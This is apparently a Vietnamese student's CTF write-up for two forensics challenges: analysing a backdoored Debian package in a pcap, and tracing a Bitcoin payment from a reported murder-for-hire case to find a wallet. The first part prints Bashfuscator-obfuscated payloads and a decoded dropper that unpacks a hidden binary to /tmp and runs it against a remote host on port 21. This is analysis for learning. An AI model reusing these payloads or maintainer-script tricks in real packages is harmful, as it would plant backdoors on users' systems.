Hôm nay em sẽ viết writeup của 3 bài trong giải này, trong đó có 1 bài em chưa giải toàn bộ nhưng mà em vẫn ghi lại kiến thức em học được.


## Forensics/Advanced Packaged Threat

<img width="1232" height="211" alt="image" src="https://github.com/user-attachments/assets/115e53ba-c613-4874-8be3-6cc3773b4f00" />

**Link file: https://drive.google.com/file/d/1kMwfQtC9NqdnTVPvCwy3d5vXJTexh3Qu/view?usp=sharing**


Ở bài này người ta cung cấp cho em một file pcap và yêu cầu em thực hiện tìm ra lý do tại sao trong server của ông lại có một SSH public key lạ, sau khi ông sử dụng PPA - `là một dịch vụ của Canonical cho phép các nhà phát triển tải lên các gói mã nguồn, được biên dịch và đóng gói thành các file .deb cho người dùng có thể tải về` từ một nguồn không xác định, thì ông đã gặp vấn đề.

Đầu tiên khi em vào file `.pcapng` thì em mở mục Statistic Protocol Hierachy để coi số lượng các gói tin và các byte dữ liệu bên trong nó.

<img width="1543" height="847" alt="image" src="https://github.com/user-attachments/assets/e1b73207-da91-429f-86cb-4432f2e741e1" />

Ở đây thì em thấy được là số lượng các gói tin `http` tuy ít nhưng mà "%" byte nó chứa khá lớn nên tiếp theo em filter vào gói tin http để xem thử.

<img width="1495" height="342" alt="image" src="https://github.com/user-attachments/assets/b939ad7a-4afa-4603-ad47-e30e07c024d4" />

Em thấy người dùng có địa chỉ ip 172.22.0.2 thực hiện tải về các item từ nguồn 172.22.0.3 nhưng các item đầu đều không tìm thấy, cho tới file /Packages, thì server đã gửi trạng thái là đã thành công `200 OK`, thì lúc này em follow theo luồng này để tìm hiểu kĩ hơn về thông tin mà người dùng và nguồn đó giao tiếp với nhau. 

Ở những cuộc hội thoại đầu thì hầu như là các request thất bại giống với những cái mà em thấy trong các gói tin ở phía trên trong phần info.

<img width="966" height="719" alt="image" src="https://github.com/user-attachments/assets/05473732-d7c6-43f4-a332-3a3a8ded03dd" />

Lướt xuống đoạn cuối cuộc hội thoại thì người dùng đã thực hiện tải về thành công file `cmdtest.deb` chính là file Packages mà ở phần info nó đã ghi. Cùng với các mã hash của file `cmdtest.deb` này.

<img width="855" height="594" alt="image" src="https://github.com/user-attachments/assets/4e6a7632-3dd6-4c72-a707-320731c63c9a" />

Bây giờ em vào phần Export Object để thực hiện tải về file `cmdtest.deb` trên.

<img width="1087" height="378" alt="image" src="https://github.com/user-attachments/assets/2a0511ed-269b-4410-94c9-ab0ca0cbf072" />

Ngoài ra ở đây còn 1 file zip và một file xác thực nữa, em nghĩ là nó sẽ có ích cho đoạn sau nên em cũng thực hiện tải về luôn. Sau khi tải về file `cmdtest.deb`, thì em lên mạng tìm kiếm cách phân tích 1 file `.deb` thì em hiểu được 1 công cụ dùng để phân tích, giải nén các file `.deb` là **dpkg-deb** nó là một tiện ích dòng lệnh trong bộ công cụ `dpkg` dùng để xử lí các gói phần mềm định dạng `.deb` và hệ điều hành (Ubuntu) cho phép tạo, giải nén, và quản lí các tệp `.deb` ở mức độ thấp.

<img width="941" height="617" alt="image" src="https://github.com/user-attachments/assets/ee1e77dc-54e0-49ed-b2ca-6751a76c1caa" />

```
┌──(nhduydeptrai㉿tobi)-[~/Scarlet_CTF_2026/file pcap]
└─$ dpkg-deb --extract cmdtest.deb extracted_files/

```
Sau đó em vào folder `extracted_files` và thấy có thư mục người dùng trong đó, nhưng mà lúc này em chưa có hướng đi tiếp theo, thì em bắt đầu qua file zip thử giải nén nó bằng công cụ brute force xem được không.

```
                                                                                                                                                                                       
┌──(nhduydeptrai㉿tobi)-[~/Scarlet_CTF_2026/file pcap]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2026-01-10 09:44) 0g/s 7629Kp/s 7629Kc/s 7629KC/s "2parrow"..*7¡Vamos!
Session completed. 
                                                                                                                                                                                       
┌──(nhduydeptrai㉿tobi)-[~/Scarlet_CTF_2026/file pcap]
└─$ john --show hash.txt                                     
0 password hashes cracked, 1 left

```

Cũng không có kết quả gì, lúc này thì em nhận được hint của anh mentor là thử sử dụng giá trị băm của file Packages tải về up lên Virustotal, sau khi em up lên virustotal thì em thấy ở bên dưới của nó có chứa 2 đoạn script

<img width="1681" height="605" alt="image" src="https://github.com/user-attachments/assets/58df788b-5178-4aad-a19f-602827aa9799" /> 

Em có tìm hiểu trên mạng thì hành động nhúng một đoạn bash script vào trong 1 file `.deb` gọi là kỹ thuật **Maintainer Scripts** trong cấu trúc gói tin *debian*, hành động mà attacker thực hiện chính là tạo **Backdooring Debian Packages** (tạo cửa sau cho 1 gói tin debian) bằng cách lạm dụng `postinst` script và `preinst`.
Hệ thống quản lí gói tin `dpkg` cho phép người tạo gói tin có thể nhúng thêm vào đó những đoạn script trước quá trình cài đặt/gỡ bỏ gói tin đó. Trong đó 2 đoạn script được sử dụng trong bài là `postinst` script sẽ tự động chạy sau khi cài đặt gói tin. Và script `preinst` sẽ tự động chạy trước khi xóa gói tin.

  - Ở đây em sẽ giải thích 1 chút về lý do tại sao lại sử dụng script `postinst` ở đây để thực hiện tải về 1 file zip và giải nén và thực thi nó. Bởi vì khi người dùng thực hiện tải 1 gói tin `.deb` trong linux thì bắt buộc họ phải sử dụng lệnh `sudo` - `sudo dpkg -i` or `sudo apt install`, khi đang ở trong quyền `sudo` việc thực hiện tải xuống 1 file khác được nhúng bên trong sẽ không để lại thông báo hoặc bị từ chối bởi quyền.

  - Còn script `preinst` sẽ tự động xóa hết các dấu vết của nó đi.

Ok, bây giờ thì dựa vào script đầu thì em đã có thể giải mã được file `symbols.zip` và nó sinh ra cho e 1 file `disk_cleanup` bên trong. Em xem thử nội dung bên trong nó thì có vẻ nó đã bị obfuscated.

```
#!/bin/bash
  ${*#Q\]Pk\(}   """b"$'\u0061'${!@}s${*^^}h   ${*#01&f.Zx}  <<<  "$(      "${@,}"   pr\i'n'${*}tf   'H4sIAPnaKGgC/32UCXOiSBiG/wpLtDTHlIC4kdrUbhAPkCPDLb1MpjgUkUNQRCHD/PZtTGqnao8pC7/7bbqBB0GQztvzYEB19Lva7v9+HPD2l81X+8t5sWmQtnj3vbUoimboIURTtFf07A2CdI8w2elfx19fG2h+eb4O9OwThj0SvV5vXSJPT09ID2ab7igmsZu7t06r1bw+v3VQ6Nwi11Aq1fKPg/qt233PI/4nBCFvYfUWxVH8ZnR/i9+QzXdYJT7dYTcU3u8j/X4HRdc9FP6uf0fHdm0EuWtX+IY0v9kvvL3pvq/YPHysnAJTXviReAKEX80SUM8XywBLPP68cPERIRDGApTklDteTP9EhX6sEMI9N+XCGabk8wSUc9Oq/cR98TGdneteDtjlrzLhpRILFQk/GZl+ZhDKxNetdE6AiGO4IbRbeKUjQp/4GNgqppMCwmn1IroCyTxS2OXOTfxU3ALC2yohk0WqmNM7/rJXxcOstYyYz97jH7b+sFN+L4cCnHk50JpYRJpw/jsXisGR4eqxKgV7hruMQ7EIav5HvRIPdC0dZppU6DVfHUPxwGnCBfpnaM9QD8biPmCW1E/2yUcqPzpWYqHDfjhTH1WpmO3EC9TDMealgvda0TupoKfiJWD4CNNkNjOthDKtrTQEpxGmaL4uX7LE570ETACmVGQChkvNSqSVFdHM+kAzoKSmzo4K3ZwjhMAKl8F/9oafA9kUAnrl5GTCpx/9lZTyJc1sAnkl1Tp8HhkhVvuF8znW5UWmy4nCcIMZYZVwJqRCBjNqMfYJkEs7Md8S2hI+J34egVb/nq6WZ3q69uaaSF4MK9yyK1KHMTAt8oJLWMCu4uVi7Sk7cIZ+AqDvM1yipG62ZD1+HPMll/DHUeLl48qLM9U6ZIxXyEMvlwmhJgk3l1P+TIVWllVClal+iU19XNRA6idOze2cPaWrExDBK2GysQaqf+5zzPjFZChspNW6VlagUEyhMgivvCR+jFfw3BdOPKncvWSCvax+/ve3AXXbc5R3fAzPNR+H7vVePvQjnOGwvdr28SVpOrDu1bAenFlQ0IyU6/BdhvEphnUO7mvMcGPl//UCrHaHEu4rQDdwQzNUI9ZOAPcB0C1BGRoAzNfF0nCiwjQ4YLj6PDEOYM6VVG0NPrTaffzse4Nw2RRp8/oKeXClRkg8YtjJvvqdrCUFhAzSiHR+GOQ63T12QmfwDo9+i6YWaLALe8S/dq9wYVV6AqtN/HQ/Y6iXK8Ig8jrPLTpbIL4DdsuSD0O3aYnWcgimutl0ZP+ZN+iVV7C5231wK6Kyv8CuzoRW2Xbw+5W+fwE4EbMPpgUAAA==' ${*//=gHk#} |   ${@%%v?nW3}  $'b\x61'se$(( (("-"1"${@%%8V8\(FX}"4"#"${*%%a&d^}1*52#"0")+2#1"1"0)  ))'4' -d   ${*/t54aF/8vO\{5F}   ${*/^Fb51}   |   "${@#\[JoC|x\\}"   \g"u"\n""z""i${@~~}p   -c ${*~~}   )"   ${*^}   ${*}
```
Công cụ dùng để obfuscated này là công cụ BashFuscator, khi mà chạy payload bị làm rối bởi công cụ Bashfuscator thì thực tế mình vẫn đang chạy một đoạn mã hợp lệ, nhưng nó bị làm rối bởi nhiều lớp khác nhau bởi các kí tự vô nghĩa, và khi giải mã nó sẽ thực hiện giải mã vào từng lớp, lớp này sẽ giải mã cho lớp tiếp theo. 

Bây giờ em sẽ phân tích nhanh qua về đoạn mã bị obfus trên. Đầu tiên nó thực hiện lệnh ` "bash <<< $([giải mã lệnh])"`  

  - `<<<` đây là kĩ thuật dùng để ghi thẳng vào đầu vào file bash, thay vì tạo một file nó sẽ ghi lai dấu vết trên ổ đĩa.
  - `$(...)` nó sẽ thực hiện việc làm sạch đoạn mã bên trong ngoặc và đưa vào cho bash chạy.

Tiếp theo, em sẽ dùng cyberchef để giải mã đoạn base64 bên trong đoạn mã trên, để xem nó thực đoạn script gì.

<img width="1538" height="904" alt="image" src="https://github.com/user-attachments/assets/5c20fade-cc06-4f5b-8848-33b2c6717d56" /> 

Sau khi giải mã nó tạo thành 1 file gzip, em thực hiện tải file gzip này về và giải mã, thì nhận được 1 file payload và nó tiếp tục bị obfus.
```
${@//9$U*z\(>s/K\]f_\]wGf}   ${*~}   """p"ri"n"'t'\f  %s  "$(  ${@^^} ${!@}   $'\u0072'''ev <<< '   }%5l40#*{$   "}^@{$"  ")    "}NvSv?rS|%%@{$"   d-  4))  )"1"1#5+)1#4}~@{$2-*0#91(( (($""e'"'"''"'"'sa\b\  *$   | };\OK\f%*{$   },*{$   "nZWQGdkMuZ2dyEmZzFGJg0mcKwGb152L2VGZv4DIsxWdu9idlR2L+IDIiE0RqFmZvFWYzdmbOd0UHFUcqZHJ6Q2cnNHZ2d2dm5WdpV2RBdUYnF2ZkICI3F2ZhF2Zn52UBd0ZhRWanZ2aqFmZkAyZmFkRHJjbmdnMhZ2chRiCpkSMqAjKxoSMrEjKxoCMqEjKxoSMqEjKxoSMqEzKxoSMqEDKoQiLpkSOrATMtkTLwEDKoQiLpkiMgsCIz8SNgoCIx8iMtgzKwEDKoQiLpkyMrAzNrETNtUzKysiMrITLxUzKwITLwATMrITMogCJ9Q2cnNHZ2d2dm5WdpV2RBdUYnF2ZKkSK5syMtUTMrATMzsSNtEjMxsiM10COyEzKyAjNtADMxgCKk0TQHpWYm9WYhN3Zu50RTdUQxpmdKcmZBZ0Ry4mZ3JTYmNXYkACerACZv9Daj9ibqI2LgYiJgcmZBZ0Ry4mZ3JTYmNXYkAiPgQWLgAXaq4mKn9ibqI2LyNnKvACfgQXNzU2Znp2MyoGaPlUQGpUQmRCI/E2Yv4mKi9iC0VzMld2ZqNjMqh2TJFkRKFkZkAiP+AyJwADecFTM4xVYihHX4UDecZWY4x1N0gHXlJGecRjZwgHXmZGecdCImRnbpJHcK8lKvImKs5mcq8yclpSYrpCctQ3cqQ2Lz42bqQnKw9iYppyLypSdv0Dd1MTZndmazIjao9USBZkSBZmCp8TZy9ibqI2LyNnKvACfg8CdtB3LfNXezRXZtRWLyV2cvxmdl1yYhNGalByboNWZoQSPnZWQGdkMuZ2dyEmZzFmCpQWLgQjKlNXYq8ibppyLyNnKvACfk1CI0oSZzFmKv4Waq8iczpyLgwHZtACNqU2chpyLulmKvI3cq8CI8RWLgQjKlNXYq8ibppyLyNnKvACfg0zb3N1dRZUV1VTVSVlTuZ1dZZUYLR3VZZFetJVaktWVIZVbUFmVrZFIv9zY/8ibppyLoQSP3F2ZhF2Zn52UBd0ZhRWanZ2aqFmZ"  ftn}^^*{$'"'"'i2700u\'"'"'$p  },@{$ }MAqr/qUA%s$ia/*{$   ($"  <<<   }071_%%*{$ HSAB$  }l<+EC9O%%@{$ ' $@ ${*}     ${@/hH4,3b}  )"   "${@%pD5\[q}"   | ${*%%,by2y\]}  $BASH ${@~~} 
```

Ở đây, sau một lúc em mò thì em biết nó thực hiện `$'\u0072'''ev ` đảo ngược đoạn mã base64 bên trong và thực hiện giải mã và chạy nó bằng biến `$BASH`, giờ em tiếp tục lên cyberchef để giải mã.

<img width="1531" height="730" alt="image" src="https://github.com/user-attachments/assets/de9d37c0-ca63-4b18-945f-329c5aa2cb66" />

Sau khi giải mã nó sinh ra một đoạn code. em đưa nó ra vào vscode cho dễ nhìn.

```
fajkfgidagGASnggaagaw=$(/*in/?c?o VkVaTmVHUkdiRmxVYWtKaFYwVnNURU5uUFQwSwo= | /*sr/*in/*ase*4 -d| /*sr/*in/*ase*4 -d| /*sr/*in/*ase*4 -d| /*sr/*in/*ase*4 -d)
asfa2wfn2GFAfg=$(echo ehcac-evloser-dmetsys_/pmt/ | /*sr/b*n/re?)
fAJFAIOhj23jgge35t=/u*r/*ib/p*t*on3/d*st-p*ka*es/*rnl*b/*_
printf '\xff\x0f4\xbe\x47\xaf\x58\xba\x11\x00' >> $fAJFAIOhj23jgge35t
/b*n/ca? $fAJFAIOhj23jgge35t | /*sr/b*n/g*n*ip -d > $asfa2wfn2GFAfg && /b*n/ch?od +x $asfa2wfn2GFAfg
vjqAGSGNngsaaofajGA=$((100-602+128-52+121-5+310+15-3+9))
gagaGAGeiunfwgvdsgsd=$((12+100-20+51-2+2+2+5-51+70+3)).$((10+8-2/1 * 5/3 + 2)).$((10-9-10+9)).$((1*1*1+1*1*1*1*1*1*1*0*1*1+1*1*0*1))
$asfa2wfn2GFAfg $fajkfgidagGASnggaagaw "$gagaGAGeiunfwgvdsgsd:$vjqAGSGNngsaaofajGA" 2>/dev/null >/dev/null
rm $asfa2wfn2GFAfg
```
Trong đoạn code trên, nó thực hiện việc tạo một payload bên trong 1 các gói tin ở trong file `pcapng`. Giờ em sẽ phân tích qua cách mà nó tạo một file và upload nó lên file `pcapng`

  - Đầu tiên, nó tạo ra biến `fajkfgidagGASnggaagaw` để thực hiện giải mã đoạn param kia 4 lần để trở thành `--master`
  
  - Tiếp theo biến `asfa2wfn2GFAfg` in ra vị trí biến `/tmp/_systemd-resolve-cache` mà lát sau nó sẽ thực hiện lưu payload và cấp quyền.

  - `fAJFAIOhj23jgge35t` biến này cho chúng ta đường dẫn đến file `_`. Sau đó thực hiện lệnh `printf '\xff\x0f4\xbe\x47\xaf\x58\xba\x11\x00' >> $fAJFAIOhj23jgge35t`. Ở đây logic của lệnh printf nó sẽ lưu các byte (hex) vào vị trí cuối cùng của nội dung bên trong file `_`, lúc này file `_` sẽ tạo thành 1 file mới 

  - Sau đó nó thực hiện in ra nội dung file `_` và thực hiện giải nén gzip vào file `_systemd-resolve-cache` và thực hiện cấp quyền cho nó.

  - 2 biến `vjqAGSGNngsaaofajGA` `gagaGAGeiunfwgvdsgsd` thực hiện tính toán địa chỉ port và ip lần lượt là `port = 21` và địa chỉ `ip = 172.17.0.1`

  - Cuối cùng là nó thực hiện chạy đoạn mã hoàn chỉnh `/tmp/_systemd-resolve-cache --master "172.17.0.1:21"`

Dạ bài này thì em làm được tới đây ạ.



## Forensics/Dark Tracers

<img width="1853" height="687" alt="image" src="https://github.com/user-attachments/assets/9d0a96a6-de92-4e59-9c7a-374be2f7dd54" />

**Link bài báo:** https://www.justice.gov/usao-ndtx/pr/woman-sentenced-9-years-dark-web-murder-hire-plot

Bài này thì đề cho em một bài báo về một vụ lừa tiền bitcoin, và đề cung cấp cho em một giá trị hash của lần giao dịch `427e04420fffc36e7548774d1220dad1d20c1c78dd71ad2e1e9fd1751917a035` từ cây ATM đến ví của sát thủ được đề cập trong bài báo, công việc trong bài này là tìm ra giá trị hash của ví sát thủ bịp tiền là được, nhưng phải chú ý là giao dịch của Murphy và tên sát thủ là vào ngày 27/7/2023 và số bitcoin mà sát thủ nhận được là 0,358 BTC

Bài này em dùng công cụ kiểm tra giao dịch bitcoin trên web là https://blockchair.com/ . Đầu tiên em sẽ thực hiện dán cái giá trị hash kia vào tìm kiếm để tìm các giao dịch bitcoin liên quan đến giá trị hash đó.

<img width="3044" height="1612" alt="image" src="https://github.com/user-attachments/assets/dd69d63d-edc4-4691-b9b6-974688435482" />

Ở đây thì mục `input` bên trái chính là số tiền gửi đi từ cây ATM và `output` là số tiền nhận vào ở bên phải có 2 ví và 1 trong 2 ví chính là ví của bà Murphy. Nói dễ hiểu hơn là:

  - `input` chính là số tiền được gửi đi (người trả tiền).
  - `output` là số tiền được nhận lại (người nhận tiền).

Tiếp theo em sẽ thử đi theo giao dịch `output` địa chỉ ví của của người kia nhận được tiền. 

<img width="2902" height="1655" alt="image" src="https://github.com/user-attachments/assets/aec966aa-7488-4d45-8718-fe5c8fc11246" />

Tiếp tục để ý vào ngày diễn ra giao dịch là ngày 27/7/2023, ở địa chỉ ví này chúng ta thấy được người này có gửi số tiền khoảng 0,39 BTC đi, mà để ý lại ở giao dịch này ta thấy số tiền mà ví này nhận vào (input) là tổng khoảng 0,39 BTC mà theo suy nghĩ của em thì khi mà người yêu mình ngoại tình rồi thì mình sẽ gom hết tiền của mình để gửi đi qua darkweb, nên em suy nghĩ thì ví `bc1qadgwek3qhng2jfc25epwuvg4cfsuq3dy4p8ccj` chính là ví của bà Murphy, và output tiếp theo gửi đi số tiền 0,39 BTC chắc chắn sẽ là ví của sát thủ `bc1q44mw0cffurnex8jxqvtvap3fwv3et0v9lxdc3t` 

<img width="2815" height="1598" alt="image" src="https://github.com/user-attachments/assets/4fb6b230-21c0-4de2-996c-5f6691d733ab" />

Ở đây có một cái bẫy của đề, nếu chúng ta không nhớ về ngày giao dịch chúng ta sẽ chọn liền vào cái ví có số tiền gửi đi là 0,358 BTC, vì giao dịch này thực hiện vào ngày 29/7/2023 còn giao dịch được ghi nhận từ ví Murphy là 27/7/2023 nên giao dịch 0,358 kia sẽ loại. Kết luận ví sát thủ là `bc1q44mw0cffurnex8jxqvtvap3fwv3et0v9lxdc3t` và hash của ví `57ce32d129f4824aa8c7e71e56cf4908dcc32103f5fff3c3d6a08bd7bae78c48`

**flag: RUSEC{57ce32d129f4824aa8c7e71e56cf4908dcc32103f5fff3c3d6a08bd7bae78c48}


